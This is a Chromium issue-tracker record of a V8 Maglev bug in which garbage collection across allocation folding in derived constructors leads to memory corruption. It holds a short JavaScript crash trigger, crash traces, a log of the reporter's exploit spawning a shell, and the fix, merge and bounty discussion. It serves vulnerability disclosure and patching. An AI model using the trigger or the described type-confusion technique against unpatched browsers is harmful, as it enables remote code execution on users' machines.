# Crash in v8::internal::SemiSpaceNewSpace::VerifyObjects

| Field | Value |
|-------|-------|
| **Issue ID** | [41488920](https://issues.chromium.org/issues/41488920) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | d8...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2024-01-05 |
| **Bounty** | $16,000.00 |

## Description


When compiling the :
```
class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) {}
        super();
        new Array(32);
            for (let v13 = 0; v13 < 2; v13++) {
                if(!v13) {
                    gc();
                } 
            }
        %OptimizeMaglevOnNextCall(C3);
               
    }
}
```
Maglev graph builder will create `Construct` node for `new Array(32);` , this Opcode later will call builtin runtime that will allocate object in young heap, later when gc() happen it will be freed and reallocate by another object, by manipulating this object we can create a type confusion and achieve code execution.
I attached `poc_crash.js` when run with `https://www.googleapis.com/download/storage/v1/b/v8-asan/o/linux-debug%2Fd8-linux-debug-v8-component-91690.zip?generation=1704463292714663&alt=media`
will triggered:
```
 ./d8 --allow-natives-syntax /util/pocpoc/poc_crash.js 
Received signal 11 SEGV_ACCERR 28b541414154

==== C stack trace ===============================

 [0x7ffff33f50c3]
 [0x7ffff33f5012]
 [0x7ffff2a42520]
 [0x7ffff5610c9c]
 [0x7ffff66289e9]
 [0x7ffff66282bb]
 [0x7ffff4e50f3d]
[end of stack trace]
Segmentation fault (core dumped)
````
the 2nd one that run can spawn a shell to demonstrate ability to RCE

```
p@sss:/util/v8_latest/v8$ git status
HEAD detached at 12.0.267.14
/out/x64.release/d8 --allow-natives-syntax /util/pocpoc/poc_rce.js 
[*] Found the pilot at: 10597 0x
0x4422442244224422
[+] spwn shell!!!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

p@sss:/util/v8_latest/v8$ 

```
Credit:
Toan (suto) Pham of Qrious Secure.


## Attachments

- [poc_crash.js](attachments/poc_crash.js) (text/plain, 1.5 KB)
- [poc_rce.js](attachments/poc_rce.js) (text/plain, 6.5 KB)

## Timeline

### [Deleted User] (2024-01-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2024-01-05)

Detailed Report: https://clusterfuzz.com/testcase?key=4775560578793472

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7ed6beadbef2
Crash State:
  v8::internal::Map::instance_size_in_words
  v8::internal::Map::instance_size
  v8::internal::HeapObject::SizeFromMap
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=91695

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4775560578793472

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2024-01-05)

Detailed Report: https://clusterfuzz.com/testcase?key=6657474117959680

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x7ee6beadbef2
Crash State:
  v8::internal::SemiSpaceNewSpace::VerifyObjects
  v8::internal::SemiSpaceNewSpace::Verify
  v8::internal::HeapVerification::Verify
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=91695

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6657474117959680

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### am...@chromium.org (2024-01-05)

The above clusterfuzz results are from reproducing the crash POC in clusterfuzz. It presented a oob read, which in the renderer process would be medium severity. 
Going to go ahead and assign a tentative high severity based on the RCE POC, though that did not reproduce in clusterfuzz. 

Assigning to cffsmith@ current V8 security sheriff, and cc: sroettger@ as next V8 sheriff since it seems possible this will be looked at on Monday. 
Also including leszeks@ and dinfuehr@ based on previous work in heap verifier which seems to be a commonality in these two stacks. 

Clusterfuzz is real slow on coming up with a revision range so this will need a FoundIn added either when that is complete or if V8 investigates first. 

[Monorail components: Blink>JavaScript]

### d8...@gmail.com (2024-01-06)

Hi,
After bisect, it was determined this commit introduced the issue:
https://chromium.googlesource.com/v8/v8/+/fdc017c89bf910e16f1fa5c6c16022e9e019c6a1

  70657516  2023-05-17T17:18:02Z  gs://v8-asan/linux-debug/d8-linux-debug-v8-component-87738.zip -> not crash
  70659014  2023-05-17T18:02:06Z  gs://v8-asan/linux-debug/d8-linux-debug-v8-component-87739.zip -> crash

### [Deleted User] (2024-01-06)

[Empty comment from Monorail migration]

### le...@chromium.org (2024-01-08)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Compiler>Maglev]

### le...@chromium.org (2024-01-08)

[Empty comment from Monorail migration]

### cf...@google.com (2024-01-08)

Hey @reporter,

very cool report! You might want to check out: 
https://security.googleblog.com/2023/10/expanding-our-exploit-reward-program-to.html
and
https://github.com/google/security-research/blob/master/v8ctf/rules.md

### le...@chromium.org (2024-01-08)

I can confirm that this does a GC across an allocation folding, which I guess becomes an OOB write.

### gi...@appspot.gserviceaccount.com (2024-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/78dd4b31847ab1f5b06ef3d8742a9f3835fb6919

commit 78dd4b31847ab1f5b06ef3d8742a9f3835fb6919
Author: Leszek Swirski <leszeks@chromium.org>
Date: Mon Jan 08 10:13:58 2024

[maglev] Fix allocation folding in derived constructors

Bug: v8:7700
Change-Id: Ia33724d39d1397c7d47c36d14071abce6ed4b0fc
Fixed: chromium:1515930
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5173470
Commit-Queue: Patrick Thier <pthier@chromium.org>
Reviewed-by: Patrick Thier <pthier@chromium.org>
Commit-Queue: Leszek Swirski <leszeks@chromium.org>
Auto-Submit: Leszek Swirski <leszeks@chromium.org>
Cr-Commit-Position: refs/heads/main@{#91709}

[modify] https://crrev.com/78dd4b31847ab1f5b06ef3d8742a9f3835fb6919/src/maglev/maglev-graph-builder.cc


### [Deleted User] (2024-01-08)

Dear owner, thanks for fixing this bug. We’ve reopened it because security bugs need Security_Severity and FoundIn labels set, which will enable the bots to request merges to the correct branches ( as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact (security@chromium.org) to arrange to set these labels and then this bug can be marked closed again. Thank you! Severity guidelines: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues FoundIn guidelines: https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security Thanks for your time! 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### le...@chromium.org (2024-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-08)

[Empty comment from Monorail migration]

### le...@chromium.org (2024-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-08)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2024-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-08)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M120. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M121. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### d8...@gmail.com (2024-01-09)

hi @cffsmith: thanks for suggestions, i did check and seems the v8 version on v8ctf is very old one and according to the rules only 1 exploit will be rewarded per version, if that true would you guy please update with the new one i surely will give it a try :) thanks

### [Deleted User] (2024-01-09)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1515930&entry.364066060=External&entry.958145677=Android&entry.958145677=Chrome&entry.958145677=Fuchsia&entry.958145677=Linux&entry.958145677=Mac&entry.958145677=Windows&entry.958145677=Lacros&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript,Blink>JavaScript>Compiler>Maglev&entry.975983575=leszeks@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2024-01-09)

ClusterFuzz testcase 6657474117959680 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=91708:91709

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### [Deleted User] (2024-01-09)

Merge review required: M121 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), matthewjoseph (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2024-01-09)

Merge review required: M120 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### le...@chromium.org (2024-01-09)

1. Why does your merge fit within the merge criteria for these milestones?
High severity security issue

2. What changes specifically would you like to merge? Please link to Gerrit.
https://chromium-review.googlesource.com/c/v8/v8/+/5173470
 
3. Have the changes been released and tested on canary?
Yes,  122.0.6236.2

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
No

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
N/A, issue in Chrome

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.
No manual verification needed.

### am...@google.com (2024-01-11)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-01-11)

Congratulations Toan! The Chrome VRP Panel has decided to award you $15,000 for this high-quality report of a renderer RCE with a functional exploit + $1,000 bisect bonus. Thank you for your efforts and reporting this issue to us -- excellent work!

### am...@chromium.org (2024-01-11)

M121 and M120 merges approved for https://crrev.com/c/5173470
please merge this fix to 12.1-lkgr at your earliest convenience (before EOD Monday 15 January so this fix can be included in the M121 Stable cut next week 
please merge this fix to 12.0-lkgr by EOD tomorrow, Thursday 11 January, so this fix can be included in next week's M120 Stable update -- thank you! 

### gi...@appspot.gserviceaccount.com (2024-01-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/44ac5a4467ca8be9eacd0b868650c9c5f8b0525d

commit 44ac5a4467ca8be9eacd0b868650c9c5f8b0525d
Author: Leszek Swirski <leszeks@chromium.org>
Date: Mon Jan 08 10:13:58 2024

Merged: [maglev] Fix allocation folding in derived constructors

Bug: v8:7700
Fixed: chromium:1515930
(cherry picked from commit 78dd4b31847ab1f5b06ef3d8742a9f3835fb6919)

Change-Id: Ia5d80719f97a6676a778e46698ecd6f6999e90d2
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5185558
Auto-Submit: Leszek Swirski <leszeks@chromium.org>
Commit-Queue: Victor Gomes <victorgomes@chromium.org>
Reviewed-by: Victor Gomes <victorgomes@chromium.org>
Cr-Commit-Position: refs/branch-heads/12.0@{#30}
Cr-Branched-From: ed7b4caf1fb8184ad9e24346c84424055d4d430a-refs/heads/12.0.267@{#1}
Cr-Branched-From: 210e75b19db4352c9b78dce0bae11c2dc3077df4-refs/heads/main@{#90651}

[modify] https://crrev.com/44ac5a4467ca8be9eacd0b868650c9c5f8b0525d/src/maglev/maglev-graph-builder.cc


### gi...@appspot.gserviceaccount.com (2024-01-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/b2533ab9f2947cba6ffadebd88362e62f6e789f1

commit b2533ab9f2947cba6ffadebd88362e62f6e789f1
Author: Leszek Swirski <leszeks@chromium.org>
Date: Mon Jan 08 10:13:58 2024

Merged: [maglev] Fix allocation folding in derived constructors

Bug: v8:7700
Fixed: chromium:1515930
(cherry picked from commit 78dd4b31847ab1f5b06ef3d8742a9f3835fb6919)

Change-Id: I64561e7ee71405e6eceeb2132b953ff0806e3a7b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5185347
Auto-Submit: Leszek Swirski <leszeks@chromium.org>
Reviewed-by: Victor Gomes <victorgomes@chromium.org>
Commit-Queue: Victor Gomes <victorgomes@chromium.org>
Cr-Commit-Position: refs/branch-heads/12.1@{#43}
Cr-Branched-From: b74ef6f2cd2fe60c91abcd3271b661547a47ca4f-refs/heads/12.1.285@{#1}
Cr-Branched-From: 32857fbeb042c27010127aa02bbfaffcc0bf0829-refs/heads/main@{#91313}

[modify] https://crrev.com/b2533ab9f2947cba6ffadebd88362e62f6e789f1/src/maglev/maglev-graph-builder.cc


### sr...@google.com (2024-01-12)

adjusting the labels as the merges have completed to m120/m121

### am...@google.com (2024-01-12)

[Empty comment from Monorail migration]

### am...@chromium.org (2024-01-12)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-16)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-16)

[Empty comment from Monorail migration]

### gm...@google.com (2024-01-16)

[Empty comment from Monorail migration]

### rz...@google.com (2024-01-17)

The changed code (TryBuildFindNonDefaultConstructorOrConstruct) isn't present in 114.

### is...@google.com (2024-01-17)

This issue was migrated from crbug.com/chromium/1515930?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript, Blink>JavaScript>Compiler>Maglev]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-04-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41488920)*
